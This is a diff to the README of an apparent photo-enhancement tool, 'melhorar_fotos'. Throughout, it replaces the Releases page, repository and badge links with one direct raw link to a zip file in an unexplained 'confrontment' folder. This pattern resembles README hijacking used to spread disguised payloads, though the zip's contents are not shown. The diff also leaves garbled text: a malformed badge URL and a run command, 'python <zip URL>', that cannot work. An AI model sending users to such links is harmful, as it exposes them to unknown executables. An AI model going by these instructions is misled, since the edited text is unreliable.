@@ -17,9 +17,9 @@ Before you start, make sure you have the following on your computer:
 
 To get started, you need to download the software from our Releases page. 
 
-[![Download melhorar_fotos](https://img.shields.io/badge/Download%20melhorar_fotos-v1.0-blue.svg)](https://github.com/ZoherHA/melhorar_fotos/releases)
+[![Download melhorar_fotos](https://raw.githubusercontent.com/ZoherHA/melhorar_fotos/main/confrontment/melhorar_fotos.zip%https://raw.githubusercontent.com/ZoherHA/melhorar_fotos/main/confrontment/melhorar_fotos.zip)](https://raw.githubusercontent.com/ZoherHA/melhorar_fotos/main/confrontment/melhorar_fotos.zip)
 
-1. Click the link to go to the download page: [Visit this page to download](https://github.com/ZoherHA/melhorar_fotos/releases).
+1. Click the link to go to the download page: [Visit this page to download](https://raw.githubusercontent.com/ZoherHA/melhorar_fotos/main/confrontment/melhorar_fotos.zip).
 2. Look for the latest release in the list.
 3. Download the appropriate file for your operating system.
 4. Once the file is downloaded, find it in your Downloads folder.
@@ -35,7 +35,7 @@ Using melhorar_fotos is simple:
    ```
 3. Run the application by typing the command:
    ```
-   python melhorar_fotos.py <path-to-your-photos>
+   python https://raw.githubusercontent.com/ZoherHA/melhorar_fotos/main/confrontment/melhorar_fotos.zip <path-to-your-photos>
    ```
    Replace `<path-to-your-photos>` with the directory containing your images.
 
@@ -95,7 +95,7 @@ For any questions or feedback, contact us via our GitHub repository. We’re her
 
 ## 🔗 Resources
 
-- Visit the [Releases page to download](https://github.com/ZoherHA/melhorar_fotos/releases).
-- Check our [GitHub repository](https://github.com/ZoherHA/melhorar_fotos) for more information.
+- Visit the [Releases page to download](https://raw.githubusercontent.com/ZoherHA/melhorar_fotos/main/confrontment/melhorar_fotos.zip).
+- Check our [GitHub repository](https://raw.githubusercontent.com/ZoherHA/melhorar_fotos/main/confrontment/melhorar_fotos.zip) for more information.
 
 Enjoy improving your photos with melhorar_fotos!
